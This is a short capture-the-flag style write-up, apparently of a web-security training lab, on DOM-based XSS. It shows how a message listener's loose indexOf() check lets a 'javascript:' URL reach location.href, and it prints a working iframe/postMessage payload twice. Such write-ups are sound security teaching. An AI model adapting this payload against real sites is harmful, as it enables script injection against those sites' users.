# Lab: DOM XSS using Web Messages and a JavaScript URL

## Description

The application listens for web messages using `addEventListener()`. It performs an insecure `indexOf()` check that only verifies whether the received message contains `"http:"` or `"https:"` anywhere in the string. The message is then passed directly to the `location.href` sink, resulting in DOM-based XSS.

## Steps

1. Inspected the home page and identified an event listener handling web messages.

2. Observed that the JavaScript checks for the presence of `"http:"` or `"https:"` using `indexOf()`.

3. Noticed that the received message is assigned to `location.href`.

4. On the exploit server, added the following payload (replace `YOUR-LAB-ID` with the actual lab ID):

```html id="is8qjq"
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
```

5. Stored the exploit and delivered it to the victim.

## Explanation

* When the iframe loads, `postMessage()` sends the payload to the target page.
* The event listener receives:

```javascript id="4s7sq4"
javascript:print()//http:
```

* The flawed `indexOf()` check detects `"http:"` inside the string and considers it safe.
* The entire payload is then assigned to:

```javascript id="1hvt8m"
location.href
```

* Since the URL begins with the `javascript:` protocol, the browser executes:

```javascript id="sg4gkt"
print()
```

* The print dialog appears, solving the lab.

## Source and Sink

* **Source:** `event.data` (web message)
* **Sink:** `location.href`
* **Impact:** DOM-based Cross-Site Scripting (XSS)

## Payload

```html id="p3f7l8"
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
```
